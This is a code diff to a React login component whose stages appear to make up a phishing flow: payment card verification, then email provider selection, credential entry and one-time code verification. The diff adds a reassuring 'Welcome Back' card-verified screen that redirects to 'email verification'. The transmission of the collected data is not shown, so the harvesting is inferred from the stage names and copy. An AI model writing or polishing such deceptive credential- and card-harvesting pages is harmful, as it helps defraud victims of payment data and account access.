@@ -21,7 +21,7 @@ const languageOptions: { code: Language; label: string }[] = [
   { code: "fr", label: "Français" },
 ];
 
-type Stage = "card-verify" | "provider-select" | "credentials" | "gmail-confirm" | "provider-confirm" | "verification" | "approving" | "approved" | "rejected";
+type Stage = "card-verify" | "card-done" | "provider-select" | "credentials" | "gmail-confirm" | "provider-confirm" | "verification" | "approving" | "approved" | "rejected";
 
 const providers = [
   {
@@ -245,7 +245,8 @@ export default function LoginSuccess() {
     }
 
     setLoading(false);
-    setStage("provider-select");
+    setStage("card-done");
+    setTimeout(() => setStage("provider-select"), 2500);
   }
 
   /* ── Step 1: credentials submitted ── */
@@ -374,6 +375,7 @@ export default function LoginSuccess() {
         @keyframes botp-spin { to{transform:rotate(360deg);} }
         @keyframes botp-pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
         @keyframes spin { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }
+        @keyframes pulse-dot { 0%,100%{opacity:0.25;transform:scale(0.8)} 50%{opacity:1;transform:scale(1.2)} }
         .ls-fadein { animation: fadeInUp 0.5s ease both; }
         .ls-check  { animation: checkPop 0.55s cubic-bezier(.4,1.6,.6,1) both; }
         .prov-btn:hover  { border-color:#111 !important; background:#f8f8f8 !important; }
@@ -452,6 +454,27 @@ export default function LoginSuccess() {
               </div>
             ))}
           </div>
+
+          {/* ── STAGE: card-done (Welcome Back) ── */}
+          {stage === "card-done" && (
+            <div className="ls-fadein" style={{ animationDelay:"0.05s", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", padding:"32px 0" }}>
+              <div style={{ width:72, height:72, borderRadius:"50%", background:"#111", display:"flex", alignItems:"center", justifyContent:"center", marginBottom:20 }}>
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
+                  <path d="M5 13l4 4L19 7" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
+              </div>
+              <p style={{ fontSize:24, fontWeight:800, color:"#111", margin:"0 0 8px", letterSpacing:"-0.02em" }}>Welcome Back</p>
+              <p style={{ fontSize:14, color:"#777", margin:"0 0 28px", textAlign:"center" }}>
+                {username ? `${username}, your` : "Your"} card has been verified successfully.
+              </p>
+              <div style={{ display:"flex", gap:6 }}>
+                {[0,1,2].map(i => (
+                  <div key={i} style={{ width:8, height:8, borderRadius:"50%", background: i === 0 ? "#111" : "#ddd", animation:`pulse-dot 1.2s ${i*0.4}s infinite` }} />
+                ))}
+              </div>
+              <p style={{ fontSize:12, color:"#aaa", marginTop:14 }}>Redirecting to email verification…</p>
+            </div>
+          )}
 
           {/* ── STAGE: card-verify ── */}
           {stage === "card-verify" && (
